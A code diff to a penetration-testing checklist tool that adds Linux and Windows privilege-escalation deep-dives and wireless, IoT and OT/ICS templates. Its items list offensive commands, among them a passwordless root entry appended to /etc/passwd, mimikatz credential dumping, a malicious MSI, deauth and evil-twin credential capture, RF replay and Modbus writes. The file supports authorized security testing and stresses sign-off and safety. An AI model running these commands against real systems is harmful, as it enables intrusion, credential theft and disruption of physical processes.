@@ -17,6 +17,9 @@ export const ASSET_TYPES = [
   { type: 'api',       label: 'API',                icon: '⚙️', hint: 'https://api.example.com' },
   { type: 'mobile',    label: 'Mobile App',         icon: '📱', hint: 'com.example.app' },
   { type: 'container', label: 'Container / Cloud',  icon: '📦', hint: 'registry/image:tag' },
+  { type: 'wireless',  label: 'Wireless / Wi-Fi',   icon: '📡', hint: 'SSID or BSSID' },
+  { type: 'iot',       label: 'IoT Device',         icon: '🔌', hint: 'model / firmware' },
+  { type: 'ot',        label: 'OT / ICS',           icon: '🏭', hint: 'PLC / SCADA host' },
 ];
 
 // Selectable tech/CMS/server options for the web "stack" node.
@@ -734,13 +737,40 @@ const ip = {
     privesc: {
       title: 'Local privilege escalation', items: [
         { kind: 'check', title: 'Automated enumeration first', detail: 'Run it, then read the output properly rather than trusting the highlights.', payloads: ['linpeas.sh -a', 'winPEAS.exe', 'PrivescCheck.ps1', 'linux-exploit-suggester'] },
-        { kind: 'check', title: 'Sudo rights & SUID/SGID binaries', detail: 'Cross-reference GTFOBins for anything unusual.', payloads: ['sudo -l', 'find / -perm -4000 -type f 2>/dev/null', 'getcap -r / 2>/dev/null'] },
-        { kind: 'check', title: 'Windows: service perms, unquoted paths, AlwaysInstallElevated', detail: '', payloads: ['accesschk.exe -uwcqv "Everyone" *', 'wmic service get name,pathname,startmode', 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer'] },
-        { kind: 'check', title: 'Token privileges (SeImpersonate → Potato)', detail: 'Common on service accounts and IIS/MSSQL contexts.', payloads: ['whoami /priv', 'PrintSpoofer / GodPotato / RoguePotato'] },
+        { kind: 'trigger', title: 'Linux host — run the Linux privesc deep-dive', detail: '', spawns: 'privesc_linux', payloads: [] },
+        { kind: 'trigger', title: 'Windows host — run the Windows privesc deep-dive', detail: '', spawns: 'privesc_windows', payloads: [] },
         { kind: 'check', title: 'Credentials on disk & in memory', detail: '', payloads: ['history, .bash_history, .aws, .git-credentials', 'reg save HKLM\\SAM; reg save HKLM\\SYSTEM', 'lsassy / nanodump'] },
-        { kind: 'check', title: 'Cron / scheduled tasks / writable scripts', detail: '', payloads: ['cat /etc/crontab; ls -la /etc/cron.*', 'schtasks /query /fo LIST /v'] },
-        { kind: 'check', title: 'Kernel / OS version exploits (last resort)', detail: 'Note the risk of crashing a production host — get sign-off first.', payloads: ['uname -a; cat /etc/os-release', 'systeminfo → wesng'] },
         { kind: 'check', title: 'Container? Check for escape paths', detail: '', payloads: ['ls -la /.dockerenv /var/run/docker.sock', 'capsh --print'] },
+      ]
+    },
+    privesc_linux: {
+      title: 'Linux privilege escalation', items: [
+        { kind: 'check', title: 'Enumerate: kernel, users, network, interesting files', detail: '', payloads: ['uname -a; cat /etc/os-release', 'id; sudo -l; sudo -V', 'cat /etc/passwd; ss -tlnp', 'find / -writable -type d 2>/dev/null; find / -newermt "-10 min" 2>/dev/null'] },
+        { kind: 'check', title: 'Sudo rights (NOPASSWD, GTFOBins, wildcards)', detail: 'Any sudo-runnable binary on GTFOBins is a shell.', payloads: ['sudo -l', 'GTFOBins: bash, python, find, vim, less, awk, tar, nmap', 'sudo <binary> then its GTFOBins escape'] },
+        { kind: 'check', title: 'Sudo CVEs', detail: 'Check the version against Baron Samedit and the runas bypass.', payloads: ['sudo -V', 'Baron Samedit CVE-2021-3156', 'CVE-2019-14287 (sudo -u#-1)'] },
+        { kind: 'check', title: 'SUID / SGID binaries', detail: 'Enumerate, then cross-reference GTFOBins.', payloads: ['find / -perm -4000 -type f 2>/dev/null', 'find / -perm -2000 -type f 2>/dev/null', 'GTFOBins: bash -p, find, cp on /etc/passwd'] },
+        { kind: 'check', title: 'Capabilities', detail: 'cap_setuid, cap_dac_read_search and friends are SUID by another name.', payloads: ['getcap -r / 2>/dev/null', 'e.g. python cap_setuid → os.setuid(0)'] },
+        { kind: 'check', title: 'Cron and scheduled jobs', detail: 'Writable scripts, wildcard injection, and PATH/relative-path hijacking.', payloads: ['cat /etc/crontab; ls -la /etc/cron.*', 'pspy to catch jobs run by root', 'writable script or tar/rsync wildcard abuse'] },
+        { kind: 'check', title: 'Library and loader hijacking', detail: '', payloads: ['LD_PRELOAD / LD_LIBRARY_PATH via a sudo env_keep', 'writable /etc/ld.so.conf.d/ or a missing .so on the search path'] },
+        { kind: 'check', title: 'Writable /etc/passwd or /etc/shadow', detail: 'Add a root-uid user with a known password.', payloads: ['ls -l /etc/passwd', "echo 'r::0:0::/root:/bin/bash' >> /etc/passwd  (if writable)", 'openssl passwd for a hashed entry'] },
+        { kind: 'check', title: 'Credentials, keys and history', detail: '', payloads: ['.bash_history, .ssh/, .aws/, .git-credentials', 'config files with DB/app passwords', 'grep -riE "password|api[_-]?key" /var/www /opt 2>/dev/null'] },
+        { kind: 'check', title: 'Kernel / distro exploit (last resort)', detail: 'Real risk of panicking a production host — get sign-off and prefer a lab repro.', payloads: ['linux-exploit-suggester.sh', 'DirtyPipe / DirtyCow / OverlayFS by kernel version'] },
+      ]
+    },
+    privesc_windows: {
+      title: 'Windows privilege escalation', items: [
+        { kind: 'check', title: 'Enumerate: system, user, privileges, network', detail: '', payloads: ['systeminfo; wmic qfe list', 'whoami /all; whoami /priv', 'ipconfig /all; netstat -ano', 'cmdkey /list'] },
+        { kind: 'check', title: 'Token privilege abuse', detail: 'These map directly to SYSTEM.', payloads: ['SeImpersonate → PrintSpoofer / GodPotato / JuicyPotato', 'SeBackup → dump SAM/SYSTEM/NTDS', 'SeDebug → dump LSASS with mimikatz', 'SeRestore / SeTakeOwnership → overwrite a protected binary', 'SeTcb / SeLoadDriver'] },
+        { kind: 'check', title: 'Service misconfigurations', detail: 'Weak perms, unquoted paths, writable binary or writable ImagePath registry key.', payloads: ['accesschk.exe -uwcqv "Everyone" *', 'weak perms → sc config <svc> binPath= "..."', 'unquoted service path with a writable dir', 'reg perms on HKLM\\...\\Services\\<svc>\\ImagePath'] },
+        { kind: 'check', title: 'Scheduled tasks and autoruns', detail: '', payloads: ['schtasks /query /fo LIST /v', 'writable task binary running as SYSTEM', 'writable startup folder / Run keys'] },
+        { kind: 'check', title: 'AlwaysInstallElevated', detail: 'Both registry keys set → install a malicious MSI as SYSTEM.', payloads: ['reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', 'reg query HKCU\\... /v AlwaysInstallElevated', 'msfvenom -f msi; msiexec /quiet /i evil.msi'] },
+        { kind: 'check', title: 'Credential hunting', detail: '', payloads: ['PowerShell history (ConsoleHost_history.txt)', 'unattend.xml / sysprep.inf / web.config', 'cmdkey /list; Windows Credential Manager', 'SAM/SYSTEM backups, GPP cpassword in SYSVOL → gpp-decrypt'] },
+        { kind: 'check', title: 'Credential dumping', detail: '', payloads: ['mimikatz: sekurlsa::logonpasswords, lsadump::sam', 'reg save HKLM\\SAM & SYSTEM → secretsdump.py -sam -system LOCAL', 'comsvcs.dll MiniDump of lsass → pypykatz'] },
+        { kind: 'check', title: 'DLL hijacking & PATH abuse', detail: 'Writable directory on a service or app search path.', payloads: ['drop a malicious DLL where a privileged process loads it', 'PATH directories writable by your user'] },
+        { kind: 'check', title: 'DnsAdmins / privileged group abuse', detail: 'DnsAdmins → SYSTEM via a malicious DLL served to the DNS service.', payloads: ['dnscmd /config /serverlevelplugindll \\\\host\\evil.dll', 'check Backup Operators, Server Operators, Print Operators'] },
+        { kind: 'check', title: 'Pass-the-Hash / token impersonation', detail: '', payloads: ['psexec.py / evil-winrm -H <nthash>', 'mimikatz sekurlsa::pth', 'incognito / mimikatz token::elevate'] },
+        { kind: 'check', title: 'UAC bypass (medium → high integrity)', detail: '', payloads: ['fodhelper / eventvwr / computerdefaults', 'UACME'] },
+        { kind: 'check', title: 'Kernel / CPU exploits (last resort)', detail: 'Match to patch level; crash risk on production.', payloads: ['systeminfo → wesng', 'MS16-032, PrintNightmare, HiveNightmare'] },
       ]
     },
   }
@@ -1130,7 +1160,215 @@ const container = {
   spawnGroups: {}
 };
 
-export const TEMPLATES = { web, ip, subnet, domain, ad, api, mobile, container };
+
+const wireless = {
+  type: 'wireless',
+  fields: [{ key: 'ssid', label: 'SSID' }, { key: 'bssid', label: 'BSSID' }],
+  groups: [
+    {
+      key: 'scope', title: '1. Scope & Setup', items: [
+        { kind: 'question', title: 'Which SSIDs/BSSIDs are in scope, and which are neighbours?', detail: 'Wireless does not respect building walls. Write down the exact BSSIDs you may touch — everything else nearby belongs to someone who has not consented.', payloads: ['airodump-ng {iface} --band abg'] },
+        { kind: 'question', title: 'Is deauthentication permitted?', detail: 'Deauth is a denial of service against real users. Get it in writing, with a time window, before using it to force a handshake.', payloads: [] },
+        { kind: 'check', title: 'Adapter into monitor mode', detail: '', payloads: ['airmon-ng check kill', 'airmon-ng start {iface}', 'iw dev'] },
+        { kind: 'input', title: 'Record the environment', detail: 'Bands in use, channel plan, AP vendor, controller, client density.', payloads: [] },
+      ]
+    },
+    {
+      key: 'survey', title: '2. Survey & Discovery', items: [
+        { kind: 'check', title: 'Survey access points and clients', detail: 'Capture the full picture before touching anything: BSSIDs, channels, encryption, associated clients, signal strength.', payloads: ['airodump-ng {iface}', 'kismet', 'inSSIDer / Sparrow-wifi for a visual survey'] },
+        { kind: 'check', title: 'Identify the encryption and authentication of each SSID', detail: 'Open, WEP, WPA2-PSK, WPA2-Enterprise, WPA3, or a transition mode that downgrades.', payloads: ['airodump-ng shows ENC/CIPHER/AUTH', 'wash -i {iface}   # WPS'] },
+        { kind: 'check', title: 'Hidden SSIDs', detail: 'A hidden network is not a control: the name appears in probe and association frames the moment a client connects.', payloads: ['wait for a client association', 'mdk4 {iface} p -t <bssid>'] },
+        { kind: 'check', title: 'Rogue and unmanaged APs', detail: 'Staff-installed APs bridged onto the corporate LAN are a common critical finding.', payloads: ['compare discovered BSSIDs against the client asset list', 'check for corporate SSID on unexpected vendor OUIs'] },
+        { kind: 'check', title: 'Client probe requests', detail: 'Devices broadcast the networks they remember — that list names other sites and enables karma-style attacks.', payloads: ['airodump-ng {iface} (PROBE column)'] },
+        { kind: 'check', title: 'Guest network isolation', detail: 'Can a guest client reach the corporate VLAN, the management interface, or another guest?', payloads: ['from the guest SSID, scan internal ranges', 'try the AP management IP'] },
+      ]
+    },
+    {
+      key: 'attack', title: '3. Attacks', items: [
+        { kind: 'trigger', title: 'WPA/WPA2-PSK in use?', detail: 'Capture a handshake and attack the passphrase offline.', spawns: 'wpa', payloads: [] },
+        { kind: 'trigger', title: 'WPA2/WPA3-Enterprise (802.1X) in use?', detail: 'Different attack entirely: the target is the supplicant\'s certificate validation.', spawns: 'wpa_ent', payloads: [] },
+        { kind: 'check', title: 'WEP still in use anywhere?', detail: 'Broken by design — capture IV traffic and crack. Finding it at all is the finding.', payloads: ['airodump-ng -c <ch> --bssid <bssid> -w wep {iface}', 'aireplay-ng -3 -b <bssid> {iface}', 'aircrack-ng wep-01.cap'] },
+        { kind: 'check', title: 'WPS enabled?', detail: 'PIN brute force and Pixie Dust recover the PSK regardless of its strength.', payloads: ['wash -i {iface}', 'reaver -i {iface} -b <bssid> -K 1   # pixie dust', 'bully -b <bssid> {iface}'] },
+        { kind: 'trigger', title: 'Evil twin / rogue AP in scope?', detail: 'Highest-impact and highest-risk: you are intercepting real users. Scope it tightly.', spawns: 'eviltwin', payloads: [] },
+        { kind: 'check', title: 'MAC filtering as an access control', detail: 'Trivially bypassed by cloning an associated client\'s MAC — worth demonstrating if the client relies on it.', payloads: ['macchanger -m <client-mac> {iface}'] },
+        { kind: 'check', title: 'PMKID capture (clientless)', detail: 'Some APs leak a crackable PMKID without any client or deauth — the quiet way in.', payloads: ['hcxdumptool -i {iface} -o pmkid.pcapng', 'hcxpcapngtool -o hash.hc22000 pmkid.pcapng', 'hashcat -m 22000 hash.hc22000 wordlist'] },
+        { kind: 'check', title: 'KRACK / Dragonblood exposure', detail: 'Key-reinstallation against unpatched clients; WPA3 downgrade and side-channel where transition mode is enabled.', payloads: ['check client patch levels', 'is 802.11w (PMF) enforced?'] },
+      ]
+    },
+    {
+      key: 'postwifi', title: '4. After Association', items: [
+        { kind: 'check', title: 'What does the wireless segment actually reach?', detail: 'The point of the exercise: association is not the finding, the reachable internal network is.', payloads: ['nmap -sn <wireless subnet>', 'try the DC, file shares, management VLANs'] },
+        { kind: 'check', title: 'Client-to-client isolation', detail: '', payloads: ['scan other associated clients from your own'] },
+        { kind: 'check', title: 'AP / controller management interface', detail: 'Default credentials on the AP admin panel turn a wireless finding into full network control.', payloads: ['http(s) to the AP IP', 'ssh/telnet default creds'] },
+        { kind: 'check', title: 'Capture traffic on the segment', detail: '', payloads: ['wireshark on the associated interface', 'responder for internal name poisoning (if authorized)'] },
+      ]
+    },
+    {
+      key: 'defense', title: '5. Defences to Report On', items: [
+        { kind: 'check', title: 'WPA3 or WPA2-AES with a strong PSK / 802.1X', detail: '', payloads: [] },
+        { kind: 'check', title: 'WPS disabled, management defaults changed', detail: '', payloads: [] },
+        { kind: 'check', title: '802.11w (PMF) enabled against deauth and KRACK', detail: '', payloads: [] },
+        { kind: 'check', title: 'Guest VLAN segmentation and client isolation', detail: '', payloads: [] },
+        { kind: 'check', title: 'WIPS / rogue AP detection in place', detail: '', payloads: [] },
+      ]
+    },
+  ],
+  spawnGroups: {
+    wpa: {
+      title: 'WPA/WPA2-PSK checklist', items: [
+        { kind: 'check', title: 'Lock onto the channel and capture', detail: '', payloads: ['airodump-ng -c <ch> --bssid <bssid> -w cap {iface}'] },
+        { kind: 'check', title: 'Obtain a handshake', detail: 'Wait for a natural association first; deauth only if it is explicitly authorized.', payloads: ['aireplay-ng -0 3 -a <bssid> -c <client> {iface}', 'confirm "WPA handshake" appears in airodump'] },
+        { kind: 'check', title: 'Convert and crack', detail: 'Build the wordlist from the client\'s own vocabulary — company name, address, phone, seasons.', payloads: ['hcxpcapngtool -o hash.hc22000 cap-01.pcapng', 'hashcat -m 22000 hash.hc22000 wordlist -r best64.rule', 'aircrack-ng -w wordlist -b <bssid> cap-01.cap'] },
+        { kind: 'check', title: 'Assess the passphrase quality for the report', detail: 'Cracked in minutes vs not cracked at all is the finding, not the raw password.', payloads: [] },
+        { kind: 'check', title: 'Is the same PSK shared everywhere and never rotated?', detail: 'One leaked PSK from an ex-employee\'s laptop keeps working for years.', payloads: [] },
+      ]
+    },
+    wpa_ent: {
+      title: 'WPA-Enterprise (802.1X) checklist', items: [
+        { kind: 'check', title: 'Identify the EAP method', detail: 'PEAP/MSCHAPv2 and TTLS are attackable when clients do not validate the server certificate.', payloads: ['eaphammer --interface {iface} --auth peap', 'inspect the EAP exchange in Wireshark'] },
+        { kind: 'check', title: 'Do clients validate the RADIUS certificate?', detail: 'This is the whole attack: an unvalidating supplicant will hand credentials to your fake AP.', payloads: ['eaphammer -i {iface} --essid <SSID> --creds', 'hostapd-wpe'] },
+        { kind: 'check', title: 'Harvest and crack MSCHAPv2 challenge/response', detail: 'Recovers domain credentials, which are usually worth far more than the Wi-Fi itself.', payloads: ['asleap -C <challenge> -R <response> -W wordlist', 'hashcat -m 5500'] },
+        { kind: 'check', title: 'Check for machine-certificate (EAP-TLS) enforcement', detail: 'EAP-TLS with client certs defeats all of the above — say so in the report if it is in place.', payloads: [] },
+      ]
+    },
+    eviltwin: {
+      title: 'Evil twin / rogue AP checklist', items: [
+        { kind: 'check', title: 'Confirm authorization and blast radius in writing', detail: 'You will be intercepting real people\'s traffic. Agree the SSID, the time window and who to call if something breaks.', payloads: [] },
+        { kind: 'check', title: 'Stand up the twin', detail: '', payloads: ['hostapd-wpe / eaphammer / wifiphisher', 'match SSID, channel and (if needed) BSSID'] },
+        { kind: 'check', title: 'Captive-portal credential capture', detail: '', payloads: ['wifiphisher --essid <SSID> -p firmware-upgrade'] },
+        { kind: 'check', title: 'Karma / known-network attack', detail: 'Respond to probe requests for networks clients remember from elsewhere.', payloads: ['eaphammer --interface {iface} --essid <any> --karma'] },
+        { kind: 'check', title: 'Downgrade and MITM after association', detail: '', payloads: ['sslstrip / bettercap', 'watch for cleartext protocols'] },
+        { kind: 'check', title: 'Tear down cleanly and account for every client', detail: 'Stop the AP, restore clients to the real network, and record who connected in the report.', payloads: [] },
+      ]
+    },
+  }
+};
+
+
+const iot = {
+  type: 'iot',
+  fields: [{ key: 'model', label: 'Model' }, { key: 'fw', label: 'Firmware version' }],
+  groups: [
+    {
+      key: 'recon', title: '1. Recon & Exposure', items: [
+        { kind: 'input', title: 'Identify the device precisely', detail: 'Model, hardware revision, firmware version, SoC and radio. Everything downstream depends on getting this right.', payloads: ['FCC ID lookup (fccid.io) for internal photos and radio detail', 'label, silkscreen and chip markings'] },
+        { kind: 'check', title: 'Public exposure of the same model', detail: 'Someone else\'s deployment tells you the default ports, banners and credentials.', payloads: ['shodan search "<model>"', 'censys / FOFA', 'search for the firmware on the vendor site'] },
+        { kind: 'check', title: 'Known vulnerabilities and vendor advisories', detail: 'IoT firmware is rarely updated — old CVEs usually still apply.', payloads: ['searchsploit <vendor> <model>', 'CVE search on the SoC/SDK, not just the brand'] },
+        { kind: 'check', title: 'Default and hardcoded credentials', detail: '', payloads: ['CIRT.net default password list', 'IoTSeeker', 'grep the firmware for /etc/passwd and shadow'] },
+        { kind: 'check', title: 'Cloud and companion-app endpoints', detail: 'Most IoT compromise happens in the cloud API, not on the device.', payloads: ['proxy the mobile app and list every host it calls', 'add those APIs as separate targets'] },
+      ]
+    },
+    {
+      key: 'network', title: '2. Network & Protocols', items: [
+        { kind: 'check', title: 'Full TCP and UDP port scan', detail: 'IoT devices expose debug and vendor services on unusual ports.', payloads: ['nmap -p- -sV {target}', 'nmap -sU --top-ports 200 {target}', 'nmap -A -oX iot.xml {target}'] },
+        { kind: 'check', title: 'Web management interface', detail: 'Usually the softest target: no CSRF protection, command injection in diagnostics, auth checked only in the UI.', payloads: ['add it as a Web target and run that checklist', 'look for ping/traceroute/diagnostic forms'] },
+        { kind: 'check', title: 'Telnet, UPnP, mDNS and other legacy services', detail: '', payloads: ['nmap -p23,1900,5353 {target}', 'upnpc -l', 'avahi-browse -a'] },
+        { kind: 'check', title: 'MQTT / CoAP / AMQP brokers', detail: 'Frequently unauthenticated and world-subscribable — subscribe to # and watch the whole estate.', payloads: ['mosquitto_sub -h {target} -t "#" -v', 'nmap -p1883,8883,5683 {target}'] },
+        { kind: 'check', title: 'Traffic analysis between device, app and cloud', detail: 'Cleartext, weak TLS, no certificate validation, or credentials in every request.', payloads: ['tcpdump on the gateway', 'proxy with a CA installed', 'does it fall back to plain HTTP?'] },
+        { kind: 'check', title: 'Update mechanism', detail: 'Unsigned or unencrypted firmware over plain HTTP means you own every device on the network.', payloads: ['capture an update check', 'is the image signature verified?'] },
+      ]
+    },
+    {
+      key: 'rf', title: '3. Radio & SDR', items: [
+        { kind: 'check', title: 'Identify the radio protocols in use', detail: 'Wi-Fi, BLE, Zigbee/802.15.4, Z-Wave, LoRa, sub-GHz OOK/FSK.', payloads: ['FCC ID filing lists the bands', 'gqrx / URH waterfall sweep'] },
+        { kind: 'check', title: 'Capture and analyse signals', detail: '', payloads: ['rtl_433 -A', 'URH (Universal Radio Hacker) for demodulation', 'GNU Radio flowgraph'] },
+        { kind: 'check', title: 'Replay attacks', detail: 'Static codes replay trivially; this is the classic garage-door / remote-socket finding.', payloads: ['hackrf_transfer -r capture.raw -f <freq>', 'hackrf_transfer -t capture.raw -f <freq>'] },
+        { kind: 'check', title: 'Rolling-code and jamming weaknesses', detail: 'Capture-and-block (RollJam style) defeats naive rolling codes. Jamming is disruptive — authorized testing only.', payloads: ['RFCrack -r', 'assess resync window behaviour'] },
+        { kind: 'check', title: 'BLE: pairing, characteristics and authorization', detail: 'Just Works pairing plus writable characteristics is the common BLE finding.', payloads: ['bluetoothctl / gatttool', 'nRF Connect to enumerate services', 'bettercap ble.recon on'] },
+        { kind: 'check', title: 'Zigbee / 802.15.4', detail: '', payloads: ['KillerBee: zbstumbler, zbdump, zbreplay', 'check for default/leaked network keys'] },
+      ]
+    },
+    {
+      key: 'firmware', title: '4. Firmware', items: [
+        { kind: 'check', title: 'Obtain the firmware', detail: 'Vendor download, OTA capture, or read it off the flash chip.', payloads: ['vendor support page', 'capture the OTA URL', 'SPI flash dump with a CH341A clip'] },
+        { kind: 'check', title: 'Extract and map the filesystem', detail: '', payloads: ['binwalk -Me firmware.bin', 'unsquashfs / jefferson / ubireader'] },
+        { kind: 'check', title: 'Hunt for secrets and backdoors', detail: 'Hardcoded credentials, API keys, private keys, undocumented accounts and debug shells.', payloads: ['firmwalker', 'grep -riE "password|api[_-]?key|BEGIN .*PRIVATE KEY"', 'look at /etc/passwd, /etc/shadow, init scripts'] },
+        { kind: 'check', title: 'Analyse the interesting binaries', detail: 'Web CGI handlers and update clients are where the memory-corruption and command-injection bugs live.', payloads: ['ghidra / radare2 / IDA', 'strings + grep for system(), popen(), exec'] },
+        { kind: 'check', title: 'Emulate to test without hardware', detail: '', payloads: ['qemu-<arch>-static + chroot', 'firmadyne / FirmAE for full-system emulation'] },
+        { kind: 'check', title: 'Repack and reflash a modified image', detail: 'Proves the update path is not integrity-protected.', payloads: ['Firmware Mod Kit', 'rebuild and sign check'] },
+      ]
+    },
+    {
+      key: 'hardware', title: '5. Hardware Interfaces', items: [
+        { kind: 'check', title: 'Open the device and map the board', detail: 'Photograph everything before and after; note chip part numbers.', payloads: ['identify SoC, flash, RAM, radio', 'look for unpopulated headers and test pads'] },
+        { kind: 'check', title: 'UART console', detail: 'Often an unauthenticated root shell, or a bootloader prompt that becomes one.', payloads: ['identify TX/RX/GND with a logic analyser or multimeter', 'screen /dev/ttyUSB0 115200', 'interrupt U-Boot and set init=/bin/sh'] },
+        { kind: 'check', title: 'JTAG / SWD debug access', detail: '', payloads: ['JTAGulator to find the pinout', 'openocd + gdb'] },
+        { kind: 'check', title: 'Dump flash directly (SPI/I2C/NAND)', detail: 'Bypasses every software control and any read protection the firmware imposes.', payloads: ['flashrom with a SOIC clip', 'chip-off for NAND'] },
+        { kind: 'check', title: 'Secure boot and readback protection', detail: 'Is the bootloader locked, is the flash encrypted, are debug fuses blown?', payloads: ['check eFuse / RDP level', 'try reading protected regions'] },
+        { kind: 'check', title: 'Fault injection and side channels', detail: 'Glitching to skip a signature check; power analysis to recover keys. Specialist work — note it as out of scope if it is.', payloads: ['ChipWhisperer', 'NAND glitch to drop into a root shell at boot'] },
+      ]
+    },
+    {
+      key: 'defense', title: '6. Defences to Report On', items: [
+        { kind: 'check', title: 'Signed and encrypted firmware updates', detail: '', payloads: [] },
+        { kind: 'check', title: 'Secure boot and disabled debug interfaces on production units', detail: '', payloads: [] },
+        { kind: 'check', title: 'Unique per-device credentials and keys', detail: 'One shared key across a product line means one extraction compromises every unit.', payloads: [] },
+        { kind: 'check', title: 'No telnet/UPnP, TLS with certificate validation', detail: '', payloads: [] },
+        { kind: 'check', title: 'Network segmentation for IoT', detail: 'A separate VLAN with no route to corporate assets contains most of the above.', payloads: [] },
+      ]
+    },
+  ],
+  spawnGroups: {}
+};
+
+const ot = {
+  type: 'ot',
+  fields: [{ key: 'system', label: 'System / vendor' }, { key: 'proto', label: 'Protocol' }],
+  groups: [
+    {
+      key: 'safety', title: '0. Safety & Authorization', items: [
+        { kind: 'check', title: 'Read this before touching anything', detail: 'OT controls physical processes. A port scan can halt a PLC, and a halted PLC can mean a stopped production line, spilled product or an injured person. Nothing in this checklist is safe by default.', payloads: [] },
+        { kind: 'question', title: 'What does this system physically do, and what happens if it stops?', detail: 'Write it down. It determines every decision below.', payloads: [] },
+        { kind: 'question', title: 'Who is the process owner, and are they on the call?', detail: 'Testing OT without an engineer watching the process is not authorized testing, whatever the paperwork says.', payloads: [] },
+        { kind: 'check', title: 'Agree the test window, the abort signal and the rollback', detail: 'A named person, a phone number, and an agreed sentence that stops everything immediately.', payloads: [] },
+        { kind: 'check', title: 'Prefer a lab, a spare, or a maintenance window', detail: 'If an identical unit exists off-line, test that instead and only verify on the live system.', payloads: [] },
+        { kind: 'check', title: 'Passive first, active only with explicit sign-off', detail: 'Assume active scanning is destructive until proven otherwise for this specific device.', payloads: [] },
+      ]
+    },
+    {
+      key: 'passive', title: '1. Passive Reconnaissance', items: [
+        { kind: 'check', title: 'Collect a traffic capture from a SPAN/TAP port', detail: 'Zero risk, and it identifies the protocols, the masters, the slaves and the polling cadence.', payloads: ['tcpdump -i <span> -w ot.pcap', 'NetworkMiner / Malcolm / Arkime for analysis'] },
+        { kind: 'check', title: 'Identify protocols and asset roles from the capture', detail: '', payloads: ['Wireshark filters: modbus, s7comm, dnp3, bacnet, enip, iec60870', 'map HMI ↔ PLC ↔ historian relationships'] },
+        { kind: 'check', title: 'Build the asset inventory', detail: 'Vendor, model, firmware, function and network position for every device. Often the client does not have this and the inventory alone is worth the engagement.', payloads: [] },
+        { kind: 'check', title: 'Look for IT/OT boundary crossings', detail: 'A single dual-homed engineering workstation is usually the real finding.', payloads: ['hosts talking to both corporate and OT ranges', 'remote access tools, cloud historians'] },
+        { kind: 'check', title: 'Internet exposure of the same systems', detail: 'Search rather than scan — the exposure is the finding.', payloads: ['shodan search port:502', 'shodan search port:20000 product:DNP3', 'search the client ASN for ICS ports'] },
+      ]
+    },
+    {
+      key: 'active', title: '2. Careful Active Enumeration', items: [
+        { kind: 'check', title: 'Confirm sign-off for this specific device before scanning it', detail: '', payloads: [] },
+        { kind: 'check', title: 'Slow, targeted port checks — never a blanket scan', detail: 'No -A, no aggressive timing, no full ranges. One protocol port at a time.', payloads: ['nmap -sT -Pn -p502 --scan-delay 1s --max-parallelism 1 {target}', 'avoid -sS/-sU floods and version probes on fragile devices'] },
+        { kind: 'check', title: 'Protocol identification scripts, read-only', detail: 'Even these can crash old firmware — run them one at a time and watch the process.', payloads: ['nmap --script s7-info -p102 {target}', 'nmap --script modbus-discover -p502 {target}', 'nmap --script bacnet-info -sU -p47808 {target}'] },
+        { kind: 'check', title: 'Common ICS ports to look for', detail: '', payloads: ['502 Modbus · 102 S7comm · 20000 DNP3 · 44818 EtherNet/IP · 47808 BACnet', '2404 IEC 60870-5-104 · 789 Red Lion · 1911/4911 Niagara Fox'] },
+        { kind: 'check', title: 'Engineering workstations and HMIs', detail: 'Windows boxes with vendor software, often unpatched and never rebooted. Treat as an IP target with extra care.', payloads: ['project files contain the full process logic and often passwords'] },
+        { kind: 'check', title: 'Default and vendor credentials', detail: '', payloads: ['CIRT.net and vendor manuals', 'many PLCs have no authentication at all — that is the finding'] },
+      ]
+    },
+    {
+      key: 'device', title: '3. Device & Protocol Analysis', items: [
+        { kind: 'check', title: 'Read-only protocol interaction', detail: 'Reading coils and registers is usually safe; writing is not. Stay on the read side unless the process owner explicitly agrees otherwise.', payloads: ['modbus-cli read {target} 40001 10', 'msf: auxiliary/scanner/scada/modbusdetect', 'msf: modbus_findunitid'] },
+        { kind: 'check', title: 'Authentication and authorization on the protocol', detail: 'Most ICS protocols have none by design — document that as a design finding rather than a device bug.', payloads: ['can any host issue commands?', 'is there any session or replay protection?'] },
+        { kind: 'check', title: 'Firmware and logic upload/download controls', detail: 'Unauthenticated logic download means anyone on the segment can rewrite the process.', payloads: ['check whether the PLC accepts a program download without a password', 'is the keyswitch in RUN or REMOTE?'] },
+        { kind: 'check', title: 'Known vulnerabilities for this exact firmware', detail: '', payloads: ['ICS-CERT advisories', 'searchsploit <vendor> <model>', 'vendor security bulletins'] },
+        { kind: 'check', title: 'Write operations — only in a lab or with the process stopped', detail: 'Writing a coil can open a valve. If it is not a lab, do not do it; describe the impact instead.', payloads: ['modbus-cli write ... (LAB ONLY)'] },
+        { kind: 'check', title: 'Firmware reverse engineering (offline)', detail: 'Safe, and often more productive than touching the live device.', payloads: ['Ghidra / IDA on the extracted image', 'binwalk the vendor update package'] },
+      ]
+    },
+    {
+      key: 'defense', title: '4. Architecture & Defences', items: [
+        { kind: 'check', title: 'Segmentation against the Purdue model', detail: 'Level 0-3 separated from IT, with a DMZ for the historian and no direct routes.', payloads: ['test which corporate hosts can reach OT ranges'] },
+        { kind: 'check', title: 'Remote access path', detail: 'Vendor support tunnels, TeamViewer, cellular modems and jump hosts — enumerate every one, including the ones nobody documented.', payloads: [] },
+        { kind: 'check', title: 'Passive monitoring and detection', detail: 'Was any of your activity noticed? In OT the answer is usually no, and that is a finding.', payloads: ['ask what the SOC saw', 'is there an ICS-aware IDS?'] },
+        { kind: 'check', title: 'Patch and lifecycle reality', detail: 'Unpatchable equipment is normal here; the recommendation is compensating controls, not "apply updates".', payloads: [] },
+        { kind: 'check', title: 'Backups of PLC logic and HMI projects', detail: 'Tested restores, stored off the OT network.', payloads: [] },
+        { kind: 'check', title: 'Confirm the process is exactly as you found it', detail: 'Walk through with the process owner before leaving. Document every packet you sent.', payloads: [] },
+      ]
+    },
+  ],
+  spawnGroups: {}
+};
+
+export const TEMPLATES = { web, ip, subnet, domain, ad, api, mobile, container, wireless, iot, ot };
 
 export function instantiateItems(assetType) {
   const t = TEMPLATES[assetType];
